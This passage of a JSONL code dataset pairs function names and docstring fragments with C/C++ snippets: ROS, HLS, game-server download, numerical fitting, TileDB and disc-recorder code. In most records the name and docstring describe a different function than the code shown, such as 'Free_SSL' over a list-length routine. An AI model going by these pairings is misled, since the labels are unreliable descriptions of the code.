channelInfo;\\n\\tchannelInfo.dwClientID = 1;\\n\\tchannelInfo.nOpenChannel = 0;\\n\\tchannelInfo.nSubChannel = u32StreamFlag;\\n\\tchannelInfo.protocolType = (NET_PROTOCOL_TYPE)NET_PROTOCOL_TCP;\/\/0;\\n\\tchannelInfo.funcStreamCallback = (ChannelStreamCallback)myStreamCallBack;\\n\\tchannelInfo.pCallbackContext = 0;\\n\\terrCode = NET_OpenChannel(devip, wPort, (CHAR *)\"admin\", user, pwd, (OPEN_CHANNEL_INFO_EX*)&channelInfo, &g_riverc_info[chn].hOpenChannel);\\n\\tif(errCode)\\n\\t{\\n\\t\\tprintf(\"chn%d NET_OpenChannel failed\\\\n\",chn);\\n\\t\\tg_riverc_info[chn].hOpenChannel = INVALID_HANDLE;\\n\\t\\tif(g_riverc_info[chn].hLogonServer != INVALID_HANDLE)\\n\\t\\t{\\n\\t\\t\\tNET_LogoffServer(g_riverc_info[chn].hLogonServer);\\n\\t\\t\\tg_riverc_info[chn].hLogonServer = INVALID_HANDLE;\\n\\t\\t}\\n\\t\\treturn -1;\\n\\t}\\n\\tg_riverc_info[chn].pStreamCB = pCB;\\n\\tg_riverc_info[chn].dwContext = dwContext;\\n\\t\\n\\tprintf(\"chn%d NET_OpenChannel success\\\\n\",chn);\\n\\t\\n\\treturn 0;\\n}'}","id":4325}
{"content":"{'function_name': 'denoiseb_rd4_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd40_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd40 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3860 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (2899 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_3860();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4327}
{"content":"{'function_name': 'moveGoalCllbck', 'docstring': '\/\/ every time a new goal is set the timer is reset', 'code': 'int main(int argc, char** argv){\\n\\tros::init(argc, argv, \"unreachable_goal_detection_server\");\\n\\tros::NodeHandle n;\\n\\tdouble sec_passed;\\n    \\n    ros::Publisher pub          =   n.advertise<std_msgs::Empty>(\"\/target_unreachable\", 1000);\\n  \\tros::Subscriber reach_sub   =   n.subscribe(\"\/target_reached\", 1000, targetReachedCallback);\\n    ros::Subscriber pose_sub    =   n.subscribe(\"\/move_base\/goal\", 1000, moveGoalCllbck);\\n    ros::Rate loop_rate(1);    \/\/ doesn\\'t need to check with high frequency\\n    \\n    while (1){\\n        sec_passed = (ros::Time::now() - target_init).toSec();\\n        if ( started && sec_passed > 120){\\n            \/\/ more than 2 minutes passed from the instant the new target position was given, we can assume it got stuck\\n            \/\/ in the meantime\\n            started = false;\\n            ROS_ERROR(\"TIMEOUT DETECTED, TARGET SHOULD BE CONSIDERED UNREACHABLE\\\\n\");\\n            pub.publish(empty_msg);\\n        }\\n        \\n        ros::spinOnce();\\n        loop_rate.sleep();\\n    }\\n    \\n\\n    return 0;\\n}'}","id":4328}
{"content":"{'function_name': 'Free_SSL', 'docstring': '\/\/ Let the deleted element become the first element of alternate link list', 'code': 'int ListLength(StaticLinkList L)\\n{\\n\\tint j = 0;\\n\\t\/\/ Get index of the first element with value\\n\\tint i = L[MAXSIZE - 1].cur;\\n\\twhile (i)\\n\\t{\\n\\t\\ti = L[i].cur;\\n\\t\\tj++;\\n\\t}\\n\\treturn j;\\n}'}","id":4334}
{"content":"{'function_name': 'custom_SV_MasterHeartbeat', 'docstring': '\/\/ disabled masterserver listing', 'code': 'void custom_SV_WriteDownloadToClient(client_t *cl, msg_t *msg)\\n{\\n\\tint curindex;\\n\\tint iwdFile;\\n\\tchar errorMessage[COD2_MAX_STRINGLENGTH];\\n\\n\\tif (cl->state == CS_ACTIVE)\\n\\t\\treturn; \/\/ Client already in game\\n\\n\\tif (!*cl->downloadName)\\n\\t\\treturn;\\t\/\/ Nothing being downloaded\\n\\n\\tif (strlen(cl->downloadName) < 4)\\n\\t\\treturn; \/\/ File length too short\\n\\n\\tif (strcmp(&cl->downloadName[strlen(cl->downloadName) - 4], \".iwd\") != 0)\\n\\t\\treturn; \/\/ Not a iwd file\\n\\n\\tif ( cl->wwwDlAck )\\n\\t\\treturn; \/\/ wwwDl acknowleged\\n\\n\\tif (strlen(sv_downloadMessage->string))\\n\\t{\\n\\t\\tCom_sprintf(errorMessage, sizeof(errorMessage), sv_downloadMessage->string);\\n\\n\\t\\tMSG_WriteByte( msg, svc_download );\\n\\t\\tMSG_WriteShort( msg, 0 ); \/\/ client is expecting block zero\\n\\t\\tMSG_WriteLong( msg, -1 ); \/\/ illegal file size\\n\\t\\tMSG_WriteString( msg, errorMessage );\\n\\n\\t\\t*cl->downloadName = 0;\\n\\t\\treturn; \/\/ Download message instead of download\\n\\t}\\n\\n\\tif (sv_wwwDownload->boolean && cl->wwwDownload)\\n\\t{\\n\\t\\tif (!cl->wwwDl_failed)\\n\\t\\t{\\n\\t\\t\\tSV_WWWRedirectClient(cl, msg);\\n\\t\\t\\treturn; \/\/ wwwDl redirect\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ Hardcode client variables to make max download speed for everyone\\n\\tcl->state = CS_CONNECTED;\\n\\tcl->rate = 25000;\\n\\tcl->snapshotMsec = 50;\\n\\n\\tif (!cl->download)\\n\\t{\\n\\t\\t\/\/ We open the file here\\n\\n\\t\\tCom_Printf(\"clientDownload: %d : begining \\\\\"%s\\\\\"\\\\n\", cl - svs.clients, cl->downloadName);\\n\\n\\t\\tiwdFile = FS_iwIwd(cl->downloadName, \"main\");\\n\\n\\t\\tif ( !sv_allowDownload->integer || iwdFile || ( cl->downloadSize = FS_SV_FOpenFileRead( cl->downloadName, &cl->download ) ) <= 0 )\\n\\t\\t{\\n\\t\\t\\t\/\/ cannot auto-download file\\n\\t\\t\\tif (iwdFile)\\n\\t\\t\\t{\\n\\t\\t\\t\\tCom_Printf(\"clientDownload: %d : \\\\\"%s\\\\\" cannot download iwd files\\\\n\", cl - svs.clients, cl->downloadName);\\n\\t\\t\\t\\tCom_sprintf(errorMessage, sizeof(errorMessage), \"EXE_CANTAUTODLGAMEIWD\\\\x15%s\", cl->downloadName);\\n\\t\\t\\t}\\n\\t\\t\\telse if ( !sv_allowDownload->boolean )\\n\\t\\t\\t{\\n\\t\\t\\t\\tCom_Printf(\"clientDownload: %d : \\\\\"%s\\\\\" download disabled\\\\n\", cl - svs.clients, cl->downloadName);\\n\\n\\t\\t\\t\\tif (sv_pure->boolean)\\n\\t\\t\\t\\t\\tCom_sprintf(errorMessage, sizeof(errorMessage), \"EXE_AUTODL_SERVERDISABLED_PURE\\\\x15%s\", cl->downloadName);\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t\\tCom_sprintf(errorMessage, sizeof(errorMessage), \"EXE_AUTODL_SERVERDISABLED\\\\x15%s\", cl->downloadName);\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tCom_Printf(\"clientDownload: %d : \\\\\"%s\\\\\" file not found on server\\\\n\", cl - svs.clients, cl->downloadName);\\n\\t\\t\\t\\tCom_sprintf(errorMessage, sizeof(errorMessage), \"EXE_AUTODL_FILENOTONSERVER\\\\x15%s\", cl->downloadName);\\n\\t\\t\\t}\\n\\n\\t\\t\\tMSG_WriteByte( msg, svc_download );\\n\\t\\t\\tMSG_WriteShort( msg, 0 ); \/\/ client is expecting block zero\\n\\t\\t\\tMSG_WriteLong( msg, -1 ); \/\/ illegal file size\\n\\t\\t\\tMSG_WriteString( msg, errorMessage );\\n\\n\\t\\t\\t*cl->downloadName = 0;\\n\\t\\t\\treturn;\\n\\t\\t}\\n\\n\\t\\t\/\/ Init\\n\\t\\tcl->downloadCurrentBlock = cl->downloadClientBlock = cl->downloadXmitBlock = 0;\\n\\t\\tcl->downloadCount = 0;\\n\\t\\tcl->downloadEOF = qfalse;\\n\\t}\\n\\n\\t\/\/ Perform any reads that we need to\\n\\twhile (cl->downloadCurrentBlock - cl->downloadClientBlock < MAX_DOWNLOAD_WINDOW && cl->downloadSize != cl->downloadCount)\\n\\t{\\n\\t\\tcurindex = (cl->downloadCurrentBlock % MAX_DOWNLOAD_WINDOW);\\n\\n\\t\\tif (!cl->downloadBlocks[curindex])\\n\\t\\t\\tcl->downloadBlocks[curindex] = (unsigned char *)Z_MallocInternal(MAX_DOWNLOAD_BLKSIZE);\\n\\n\\t\\tcl->downloadBlockSize[curindex] = FS_Read( cl->downloadBlocks[curindex], MAX_DOWNLOAD_BLKSIZE, cl->download );\\n\\n\\t\\tif (cl->downloadBlockSize[curindex] < 0)\\n\\t\\t{\\n\\t\\t\\t\/\/ EOF right now\\n\\t\\t\\tcl->downloadCount = cl->downloadSize;\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\tcl->downloadCount += cl->downloadBlockSize[curindex];\\n\\n\\t\\t\/\/ Load in next block\\n\\t\\tcl->downloadCurrentBlock++;\\n\\t}\\n\\n\\t\/\/ Check to see if we have eof condition and add the EOF block\\n\\tif (cl->downloadCount == cl->downloadSize && !cl->downloadEOF && cl->downloadCurrentBlock - cl->downloadClientBlock < MAX_DOWNLOAD_WINDOW)\\n\\t{\\n\\t\\tcl->downloadBlockSize[cl->downloadCurrentBlock % MAX_DOWNLOAD_WINDOW] = 0;\\n\\t\\tcl->downloadCurrentBlock++;\\n\\t\\tcl->downloadEOF = qtrue;  \/\/ We have added the EOF block\\n\\t}\\n\\n\\t\/\/ Write out the next section of the file, if we have already reached our window,\\n\\t\/\/ automatically start retransmitting\\n\\n\\tif (cl->downloadClientBlock == cl->downloadCurrentBlock)\\n\\t\\treturn; \/\/ Nothing to transmit\\n\\n\\tif (cl->downloadXmitBlock == cl->downloadCurrentBlock)\\n\\t{\\n\\t\\t\/\/ We have transmitted the complete window, should we start resending?\\n\\n\\t\\t\/\/FIXME:  This uses a hardcoded one second timeout for lost blocks\\n\\t\\t\/\/the timeout should be based on client rate somehow\\n\\t\\tif (svs.time - cl->downloadSendTime > 1000)\\n\\t\\t\\tcl->downloadXmitBlock = cl->downloadClientBlock;\\n\\t\\telse\\n\\t\\t\\treturn;\\n\\t}\\n\\n\\t\/\/ Send current block\\n\\tcurindex = (cl->downloadXmitBlock % MAX_DOWNLOAD_WINDOW);\\n\\n\\tMSG_WriteByte( msg, svc_download );\\n\\tMSG_WriteShort( msg, cl->downloadXmitBlock );\\n\\n\\t\/\/ block zero is special, contains file size\\n\\tif ( cl->downloadXmitBlock == 0 )\\n\\t\\tMSG_WriteLong( msg, cl->downloadSize );\\n\\n\\tMSG_WriteShort( msg, cl->downloadBlockSize[curindex] );\\n\\n\\t\/\/ Write the block\\n\\tif ( cl->downloadBlockSize[curindex] )\\n\\t\\tMSG_WriteData( msg, cl->downloadBlocks[curindex], cl->downloadBlockSize[curindex] );\\n\\n\\tCom_DPrintf(\"clientDownload: %d : writing block %d\\\\n\", cl - svs.clients, cl->downloadXmitBlock);\\n\\n\\t\/\/ Move on to the next block\\n\\t\/\/ It will get sent with next snap shot.  The rate will keep us in line.\\n\\tcl->downloadXmitBlock++;\\n\\n\\tcl->downloadSendTime = svs.time;\\n}'}","id":4337}
{"content":"{'function_name': 'vec_normalize', 'docstring': '\/\/output normalized vector\\r', 'code': 'T vec_length(const vector<T> &input)\\r\\n{\/\/compute vector length\\r\\n    auto output = 0.0f;\\r\\n    for(int i = 0 ; i < (int)input.size() ; i++)\\r\\n        output+= pow(input[i],2);\\r\\n    return pow(output,0.5);\\r\\n}'}","id":4348}
{"content":"{'function_name': 'PrintHessian', 'docstring': '\/\/out.precision(3);', 'code': 'bool\\nLevenbergMarquardt(const vector<double>& vvalues, \/\/given values\\n\\t\\t\\t\\t   vector<double>& vEstimates, \/\/parameters to be derived\\n\\t\\t\\t\\t   double (*func)(const vector<double>&, int n,  const void*), \/\/function for evaluation\\n\\t\\t\\t\\t   surreal (*funcD)(const vector<surreal>&, int n, const void*), \/\/function for derivatives\\n\\t\\t\\t\\t   int maxIter,\\n\\t\\t\\t\\t   double weight,\\n\\t\\t\\t\\t   const void* pParam, \/\/general purpose parameters for modeling\\n\\t\\t\\t\\t   const double* plBounds, \/\/lower bounds of each estimate\\n\\t\\t\\t\\t   const double* puBounds,  \/\/upper bounds of each estimate\\n\\t\\t\\t\\t   const double* pWeights,\\t\/\/weights for each square term\\n\\t\\t\\t\\t   ostream* out\\n\\t\\t\\t\\t  )\\n{\\n\\tint n = vvalues.size();\\n\\tint np = vEstimates.size();\\n\\tvector<double> verror(n);\\n\\tint i, j, k;\\n\\n\\t\/\/first find out the amount of discrepancy\\n\\tdouble error = 0;\\n\\t\/\/cout << \"LevenbergMarquardt (Entry):\" << endl;\\n\\tfor(j=0; j<n; ++j)\\n\\t{\\n\\t\\tdouble val = func(vEstimates, j, pParam);\\n\\t\\tverror[j] = vvalues[j] - val;\\n\\t\\tif(pWeights)\\n\\t\\t{\\n\\t\\t\\tverror[j] *= pWeights[j];\\n\\t\\t}\\n\\t\\terror += verror[j]*verror[j];\\n\\t\\t\/\/cout << j << \": \" << verror[j] << endl;\\n\\t}\\n\\n\\tfor(i=0; i<maxIter; ++i)\\n\\t{\\n\\t\\t\/\/compute the gradient and Hessian\\n\\t\\tvector<double> vHessian(np*np, 0);\\n\\t\\tvector<double> vGrad(np, 0);\\n\\t\\tvector<surreal> vderive(np);\\n\\t\\tvector<surreal> vdtmp(np);\\n\\t\\tfor(j=0; j<n; ++j)\\n\\t\\t{\\n\\t\\t\\tint m, l;\\n\\t\\t\\tfor(m=0; m<np; ++m)\\n\\t\\t\\t{\\n\\t\\t\\t\\tfor(l=0; l<np; ++l)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tvdtmp[l].setReal(vEstimates[l]);\\n\\t\\t\\t\\t\\tif(l==m)\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tvdtmp[l].setImag(1.0);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\telse\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tvdtmp[l].setImag(0.0);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tvderive[m] = funcD(vdtmp, j, pParam);\\n\\t\\t\\t}\\n\\t\\t\\tfor(m = 0; m < np; ++m)\\n\\t\\t\\t{\\n\\t\\t\\t\\tvGrad[m] -= verror[j] * Imag(vderive[m]);\\n\\t\\t\\t\\tfor(l = 0; l < np; ++l)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tdouble hs;\\n\\t\\t\\t\\t\\tif(l==m)\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\ths = (1+weight) * Imag(vderive[m]) * Imag(vderive[l]);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\telse\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\ths = Imag(vderive[m]) * Imag(vderive[l]);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\tif(pWeights)\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tvHessian[m*np+l] += hs * pWeights[j] * pWeights[j];\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\telse\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\tvHessian[m*np+l] += hs;\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tif(i==0 && out)\\n\\t\\t{\\n\\t\\t\\t*out << n << \", \" << np << endl;\\n\\t\\t\\tPrintGradient(*out, vGrad, np);\\n\\t\\t\\tPrintHessian(*out, vHessian, np);\\n\\t\\t}\\n\\t\\t\/\/update the parameter temporarily\\n\\t\\tvector<double> vDelta = vGrad;\\n\\t\\tif(!GaussJordan(vHessian, vDelta, np))\\n\\t\\t{\\n\\t\\t\\treturn false;\\n\\t\\t}\\n\\n\\t\\t\/\/make sure that the resulting estimates will be within given bounds\\n\\t\\tdouble rateDescent = 1.0;\\n\\t\\tif(puBounds != NULL)\\n\\t\\t{\\n\\t\\t\\tfor(j=0; j<np; ++j)\\n\\t\\t\\t{\\n\\t\\t\\t\\tdouble slack;\\n\\t\\t\\t\\tdouble a = 1.0;\\n\\t\\t\\t\\tif(vDelta[j] < 0) \/\/note that vDelta will be subtracted\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tslack = puBounds[j] - vEstimates[j];\\n\\t\\t\\t\\t\\tif(slack < -vDelta[j])\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\ta = slack \/ (-vDelta[j]);\\n\\t\\t\\t\\t\\t\\trateDescent = Min(rateDescent,a);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tif(plBounds != NULL)\\n\\t\\t{\\n\\t\\t\\tfor(j=0; j<np; ++j)\\n\\t\\t\\t{\\n\\t\\t\\t\\tdouble slack;\\n\\t\\t\\t\\tdouble a = 1.0;\\n\\t\\t\\t\\tif(vDelta[j] > 0) \/\/note that vDelta will be subtracted\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tslack = vEstimates[j] - plBounds[j];\\n\\t\\t\\t\\t\\tif(slack < vDelta[j])\\n\\t\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t\\ta = slack \/ vDelta[j];\\n\\t\\t\\t\\t\\t\\trateDescent = Min(rateDescent,a);\\n\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tif(rateDescent <= 0)\\n\\t\\t{\\n\\t\\t\\t\/\/cerr << \"LevenbergMarquardt: negative descent rate of \" << rateDescent << \" found.\\\\n\";\\n\\t\\t}\\n\\n\\t\\tvector<double> vEstimates2 = vEstimates;\\n\\t\\tdouble val;\\n\\t\\tfor(j=0; j<np; ++j)\\n\\t\\t{\\n\\t\\t\\tvEstimates2[j] -= rateDescent * vDelta[j];\\n\\t\\t\\tval = vEstimates2[j];\\n\\t\\t}\\n\\n\\t\\t\/\/check if the update improve the model\\n\\t\\tvector<double> verror2(n);\\n\\t\\tdouble error2 = 0;\\n\\t\\t\/\/cout << \"LevenbergMarquardt (\" << i << \"):\" << endl;\\n\\t\\tfor(j=0; j<n; ++j)\\n\\t\\t{\\n\\t\\t\\tdouble val = func(vEstimates2, j, pParam);\\n\\t\\t\\tverror2[j] = vvalues[j] - val;\\n\\t\\t\\tif(pWeights)\\n\\t\\t\\t{\\n\\t\\t\\t\\tverror2[j] *= pWeights[j];\\n\\t\\t\\t}\\n\\t\\t\\terror2 += verror2[j]*verror2[j];\\n\\t\\t\\t\/\/cout << j << \": \" << verror2[j] << endl;\\n\\t\\t}\\n\\t\\tif(out)\\n\\t\\t{\\n\\t\\t\\t*out << i << \": rate = \" << rateDescent << \" weight = \" << weight;\\n\\t\\t\\t*out << \" error = \" << error << \", error2 = \" << error2;\\n\\t\\t\\t*out << (error > error2 ? \" updated\" : \"\") << endl;\\n\\t\\t\\t*out << \"Estimate: [\";\\n\\t\\t\\t\\tfor(int i2=0; i2<vEstimates2.size(); ++i2)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\t*out << vEstimates2[i2] << \" \";\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\t*out << \"]\" << endl;\\n\\t\\t}\\n\\n\\t\\t\/\/take an appropriate action \\n\\t\\tif(error2 < error)\\n\\t\\t{\\n\\t\\t\\tvEstimates = vEstimates2;\\n\\t\\t\\terror = error2;\\n\\t\\t\\tverror = verror2;\\n\\t\\t\\tweight *= 0.1;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tweight *= 10.0;\\n\\t\\t}\\n\\t}\\n\\n\\tif(out)\\n\\t{\\n\\t\\t*out << \"Results: [\";\\n\\t\\tfor(i=0; i<vEstimates.size(); ++i)\\n\\t\\t{\\n\\t\\t\\t*out << vEstimates[i] << \" \";\\n\\t\\t}\\n\\t\\t*out << \"]\" << endl;\\n\\t}\\n\\treturn true;\\n}'}","id":4353}
{"content":"{'function_name': 'clause_to_capnp', 'docstring': '\/\/ Validate and store the query condition op.', 'code': 'Status condition_to_capnp(\\n    const QueryCondition& condition,\\n    capnp::Condition::Builder* condition_builder) {\\n  const tdb_unique_ptr<ASTNode>& ast = condition.ast();\\n  assert(!condition.empty());\\n\\n  \/\/ Validate and store the query condition AST.\\n  auto ast_builder = condition_builder->initTree();\\n  RETURN_NOT_OK(condition_ast_to_capnp(ast, &ast_builder));\\n\\n  \/\/ For backwards compatability, we should also set the clauses and combination\\n  \/\/ ops vectors when the current query condition.\\n  if (ast->is_backwards_compatible()) {\\n    if (ast->is_expr()) {\\n      \/\/ We assume that the serialized values of the clauses are validated\\n      \/\/ properly.\\n      const std::vector<tdb_unique_ptr<ASTNode>>& clauses_vec =\\n          ast->get_children();\\n      auto clauses_builder = condition_builder->initClauses(clauses_vec.size());\\n      for (size_t i = 0; i < clauses_vec.size(); ++i) {\\n        auto clause_builder = clauses_builder[i];\\n        clause_to_capnp(clauses_vec[i], &clause_builder);\\n      }\\n\\n      \/\/ Validating and storing the combination op vector.\\n      if (clauses_vec.size() > 1) {\\n        auto combination_ops_builder =\\n            condition_builder->initClauseCombinationOps(clauses_vec.size() - 1);\\n        for (size_t i = 0; i < clauses_vec.size() - 1; ++i) {\\n          const std::string op_str = query_condition_combination_op_str(\\n              QueryConditionCombinationOp::AND);\\n          ensure_qc_combo_op_string_is_valid(op_str);\\n          combination_ops_builder.set(i, op_str);\\n        }\\n      }\\n    } else {\\n      \/\/ We assume the serialized value of the clause is verified properly.\\n      auto clauses_builder = condition_builder->initClauses(1);\\n      auto clause_builder = clauses_builder[0];\\n      clause_to_capnp(ast, &clause_builder);\\n    }\\n  }\\n  return Status::Ok();\\n}'}","id":4361}
{"content":"{'function_name': 'string_format', 'docstring': \"\/\/ We don't want the '\\\\0' inside\", 'code': 'NVGcolor colorMap(double f) {\\n\\tconst auto clamp_access = [](const vector<Eigen::Vector3d> &v, int i) { return v[std::min(std::max(i, 0), int(v.size() - 1))]; }; \/\/ FORNOW\\n\\tvector<Eigen::Vector3d> plasma = { { 0.050383,0.029803,0.527975 },{ 0.171574,0.019706,0.580806 },{ 0.261183,0.013308,0.617911 },{ 0.35015,0.004382,0.646298 },{ 0.429719,0.000831,0.659425 },{ 0.512206,0.018833,0.655209 },{ 0.584391,0.068579,0.632812 },{ 0.65558,0.129725,0.592317 },{ 0.714883,0.187299,0.546338 },{ 0.771958,0.249237,0.494813 },{ 0.819651,0.306812,0.448306 },{ 0.866078,0.36966,0.400126 },{ 0.904601,0.429797,0.356329 },{ 0.940313,0.497642,0.309197 },{ 0.966798,0.564396,0.265118 },{ 0.986345,0.640969,0.217948 },{ 0.994324,0.716681,0.177208 },{ 0.989587,0.803205,0.146529 },{ 0.970533,0.887896,0.145919 },{ 0.940015,0.975158,0.131326 } };\\n\\tint N = plasma.size(); \\n\\tf = clamp01(f); \\n\\tdouble i_plus_frac = f * (N - 1);\\n\\tint i = (int)floor(i_plus_frac);\\n\\tdouble g = i_plus_frac - i; \\n\\tauto L = clamp_access(plasma, i);\\n\\tauto R = clamp_access(plasma, i + 1);\\n\\tauto tmp = lerp(g, L, R);\\n\\tauto Q = [](const double &c) {return int(255 * clamp01(c)); };\\n\\treturn nvgRGB(Q(tmp[0]), Q(tmp[1]), Q(tmp[2]));\\n}'}","id":4362}
{"content":"{'function_name': 'demosaic_bxb_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_bxb_rd2_select(demosaic_cache& demosaic, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_bxb_rd2 read pattern: { demosaic_bxb_update_0[d0, d1] -> demosaic[2 + 2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaic_bxb_update_0[d0, d1] -> [3 + d1, 3 + d0, 6] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { demosaic_update_0[d0, d1] -> [3 + d1, 2 + d0, 5] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_demosaic_update_0_write0 = demosaic.demosaic_demosaic_update_0_write0_merged_banks_4.peek_0();\\n  return value_demosaic_demosaic_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4363}
{"content":"{'function_name': 'IKasin', 'docstring': '\/\/ any more error implies something is wrong with the solver', 'code': 'inline float IKacos(float f)\\n{\\nIKFAST_ASSERT( f > -1-IKFAST_SINCOS_THRESH && f < 1+IKFAST_SINCOS_THRESH ); \/\/ any more error implies something is wrong with the solver\\nif( f <= -1 ) return float(IKPI);\\nelse if( f >= 1 ) return float(0);\\nreturn acosf(f);\\n}'}","id":4364}
{"content":"{'function_name': 'vpgl_load_rational_camera_process_cons', 'docstring': '\/\/ label image', 'code': 'bool vpgl_load_rational_camera_process(bprb_func_process& pro)\\n{\\n  if (pro.n_inputs()< 1) {\\n    std::cout << \"lvpgl_load_rational_camera_process: The input number should be 1\" << std::endl;\\n    return false;\\n  }\\n\\n  \/\/ get the inputs\\n  std::string camera_filename = pro.get_input<std::string>(0);\\n\\n  vpgl_camera_double_sptr ratcam = read_local_rational_camera<double>(camera_filename);\\n\\n  if ( !ratcam.as_pointer() ) {\\n    \/\/std::cerr << \"Rational camera isn\\'t local... trying global\" << std::endl;\\n    ratcam = read_rational_camera<double>(camera_filename);\\n\\n  }\\n\\n  if ( !ratcam.as_pointer() ) {\\n    std::cerr << \"Failed to load rational camera from file\" << camera_filename << std::endl;\\n    return false;\\n  }\\n\\n  pro.set_output_val<vpgl_camera_double_sptr>(0, ratcam);\\n\\n  return true;\\n}'}","id":4365}
{"content":"{'function_name': 'ImageWriter', 'docstring': '\/\/ verify that clearing the disc recorder works', 'code': 'HRESULT EjectClose(PROGRAM_OPTIONS options, BOOLEAN close)\\n{\\n    HRESULT hr = S_OK;\\n    IDiscRecorder2* recorder = NULL;\\n    ULONG index = options.WriterIndex;\\n    BOOL disableMCN = FALSE;\\n\\n    \/\/ create a DiscRecorder object\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = GetDiscRecorder(index, &recorder);\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED to get disc recorder for eject\/close\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ Try and prevent shell pop-ups\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = recorder->DisableMcn();\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED to enable MCN after Eject\/Close\\\\n\");\\n            PrintHR(hr);\\n        }\\n        else\\n        {\\n            \/\/ Will use this flag instead of HR, in case there is a failure later on\\n            \/\/ we still want to enable MCN\\n            disableMCN = TRUE;\\n        }\\n    }\\n\\n    if (SUCCEEDED(hr))\\n    {\\n        VARIANT_BOOL canLoad = VARIANT_FALSE;\\n        hr = recorder->get_DeviceCanLoadMedia(&canLoad);\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED recorder->get_DeviceCanLoadMedia\\\\n\");\\n            PrintHR(hr);\\n        }\\n        if (canLoad && close)\\n        {\\n            hr = recorder->CloseTray();\\n            if (FAILED(hr))\\n            {\\n                printf(\"FAILED recorder->CloseTray()\\\\n\");\\n                PrintHR(hr);\\n            }\\n        }\\n        else if (canLoad)\\n        {\\n            hr = recorder->EjectMedia();\\n            if (FAILED(hr))\\n            {\\n                printf(\"FAILED recorder->EjectMedia()\\\\n\");\\n                PrintHR(hr);\\n            }\\n        }\\n    }\\n\\n    \/\/ re-enable MCN\\n    if (disableMCN)\\n    {\\n        hr = recorder->EnableMcn();\\n        if (FAILED(hr))\\n        {\\n            printf(\"FAILED to enable MCN after Eject\/Close\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    ReleaseAndNull(recorder);\\n\\n    if (SUCCEEDED(hr))\\n    {\\n\\n    }\\n    else\\n    {\\n        printf(\"EjectClose FAILED for drive index %d\\\\n\",\\n               index\\n              );\\n        PrintHR(hr);\\n    }\\n    return hr;\\n}'}","id":4366}
